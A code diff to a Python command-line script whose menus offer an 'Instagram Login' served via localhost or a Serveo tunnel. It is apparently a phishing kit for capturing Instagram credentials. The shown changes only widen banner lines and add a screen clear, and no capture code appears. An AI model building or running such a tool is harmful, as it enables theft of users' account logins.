@@ -82,11 +82,12 @@ def start_serveo_tunnel(port):
 def instagram_login_menu():
     clear_screen()
     display_logo()
-    print(colored("=" * 50, 'yellow', attrs=['bold']))
+    print(colored("=" * 80, 'yellow', attrs=['bold']))
+    print(colored("=" * 80, 'yellow', attrs=['bold']))
     print(colored("              [01] Localhost", 'cyan', attrs=['bold']))
     print(colored("              [02] Serveo", 'cyan', attrs=['bold']))
     print(colored("              [00] Back", 'red', attrs=['bold']))
-    print(colored("=" * 50, 'yellow', attrs=['bold']))
+    print(colored("=" * 80, 'yellow', attrs=['bold']))
     print("\n")
 
     choice = input(colored("Select an option: ", 'cyan', attrs=['bold']))
@@ -105,15 +106,17 @@ def instagram_login_menu():
         instagram_login_menu()
 
 def display_main_menu():
-    print(colored("=" * 50, 'yellow', attrs=['bold']))
+    print(colored("=" * 80, 'yellow', attrs=['bold']))
+    print(colored("=" * 80, 'yellow', attrs=['bold']))
     print(colored("              [01] Instagram Login", 'cyan', attrs=['bold']))
     print(colored("              [00] Exit", 'red', attrs=['bold']))
-    print(colored("=" * 50, 'yellow', attrs=['bold']))
+    print(colored("=" * 80, 'yellow', attrs=['bold']))
     print("\n")
 
 def main_menu():
     clear_screen()
     check_for_updates()
+    clear_screen()
     display_logo()
     while True:
         display_main_menu()
